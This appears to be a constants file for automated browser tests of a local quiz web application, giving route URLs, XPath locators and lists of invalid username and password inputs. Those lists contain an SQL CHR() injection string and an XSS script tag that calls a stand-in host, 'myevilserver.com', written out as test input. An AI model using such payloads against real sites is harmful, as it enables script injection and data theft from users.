BROWSER = "chrome"
# increase a little for non-headless runs to see what's going on
DELAY = "0 seconds"
BASE_URL = "http://localhost:5000"

ROUTES_DICT = {
    'Landing': f"{BASE_URL}",
    'Register': f"{BASE_URL}/register",
    'Login': f"{BASE_URL}/login",
    'Quiz': f"{BASE_URL}/quiz",
}

DEFAULT_ANSWER_OPTIONS = 2
MAX_ANSWER_OPTIONS = 5

ANSWER_INPUTS = "//*[@id='answeropts']/input[contains(@id,'answeropt')]"
ANSWER_CHECKBOXES = "//*[@id='answeropts']/input[contains(@id,'iscorrect')]"
VISIBLE_QUIZZES = "//*[@id='quizlist']/div/span"

NEXT_QUESTION_BUTTON = "//*[@id='content']/form/input[@value='Next']"
LOGOUT_BTN = "//input[@value='Logout']"
ADD_ANSWER_BTN = "Add answer"
ADD_QUIZ_BTN = "Create"
ADD_QUESTION_BTN = "Create"
START_QUIZ_BUTTON = "Start quiz"

EMPTY = ""

NAIVE_INVALID_INPUTS_TO_USERNAME = [
    EMPTY,
    ' ',
    'y',
    'yo',
    'yoy',
    'yoyo',
    'yoyoy',
    ' yoyoy',
    'asdfasdfa___&',
    '<strong>Murmeli</strong>',
    'CHR(104)||CHR(101)||CHR(108)||CHR(108)',
    '<script>fetch("http://myevilserver.com").then(r => r.json()).then(() => console.log("do something evil"))</script>'
]

NAIVE_INVALID_INPUTS_TO_PASSWORD = [
    EMPTY,
    ' ',
    'y',
    'yo',
    'yoy',
    'yoyo',
    'yoyoy',
    ' yoyoy',
    '<strong>Murmeli</strong>',
    'CHR(104)||CHR(101)||CHR(108)||CHR(108)',
    '<script>fetch("http://myevilserver.com").then(r => r.json()).then(() => console.log("do something evil"))</script>'
]
